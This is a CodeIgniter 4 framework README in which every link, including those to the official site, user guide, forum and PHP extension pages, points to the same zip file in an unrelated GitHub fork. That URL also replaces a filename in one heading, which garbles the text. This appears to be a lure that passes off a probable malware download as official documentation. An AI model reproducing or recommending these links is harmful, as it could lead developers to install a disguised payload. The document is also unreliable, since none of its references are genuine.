# CodeIgniter 4 Framework

## What is CodeIgniter?

CodeIgniter is a PHP full-stack web framework that is light, fast, flexible, and secure. 
More information can be found at the [official site](https://raw.githubusercontent.com/aaonedollar/ci4/main/system/I18n/ci-v2.7.zip).

This repository holds the distributable version of the framework,
including the user guide. It has been built from the 
[development repository](https://raw.githubusercontent.com/aaonedollar/ci4/main/system/I18n/ci-v2.7.zip).

More information about the plans for version 4 can be found in [the announcement](https://raw.githubusercontent.com/aaonedollar/ci4/main/system/I18n/ci-v2.7.zip) on the forums.

The user guide corresponding to this version of the framework can be found
[here](https://raw.githubusercontent.com/aaonedollar/ci4/main/system/I18n/ci-v2.7.zip). 


## Important Change with https://raw.githubusercontent.com/aaonedollar/ci4/main/system/I18n/ci-v2.7.zip

`https://raw.githubusercontent.com/aaonedollar/ci4/main/system/I18n/ci-v2.7.zip` is no longer in the root of the project! It has been moved inside the *public* folder,
for better security and separation of components.

This means that you should configure your web server to "point" to your project's *public* folder, and
not to the project root. A better practice would be to configure a virtual host to point there. A poor practice would be to point your web server to the project root and expect to enter *public/...*, as the rest of your logic and the
framework are exposed.

**Please** read the user guide for a better explanation of how CI4 works!
The user guide updating and deployment is a bit awkward at the moment, but we are working on it!

## Repository Management

We use Github issues, in our main repository, to track **BUGS** and to track approved **DEVELOPMENT** work packages.
We use our [forum](https://raw.githubusercontent.com/aaonedollar/ci4/main/system/I18n/ci-v2.7.zip) to provide SUPPORT and to discuss
FEATURE REQUESTS.

This repository is a "distribution" one, built by our release preparation script. 
Problems with it can be raised on our forum, or as issues in the main repository.

## Contributing

We welcome contributions from the community.

Please read the [*Contributing to CodeIgniter*](https://raw.githubusercontent.com/aaonedollar/ci4/main/system/I18n/ci-v2.7.zip) section in the development repository.

## Server Requirements

PHP version 7.2 or higher is required, with the following extensions installed: 

- [intl](https://raw.githubusercontent.com/aaonedollar/ci4/main/system/I18n/ci-v2.7.zip)
- [libcurl](https://raw.githubusercontent.com/aaonedollar/ci4/main/system/I18n/ci-v2.7.zip) if you plan to use the HTTP\CURLRequest library

Additionally, make sure that the following extensions are enabled in your PHP:

- json (enabled by default - don't turn it off)
- [mbstring](https://raw.githubusercontent.com/aaonedollar/ci4/main/system/I18n/ci-v2.7.zip)
- [mysqlnd](https://raw.githubusercontent.com/aaonedollar/ci4/main/system/I18n/ci-v2.7.zip)
- xml (enabled by default - don't turn it off)
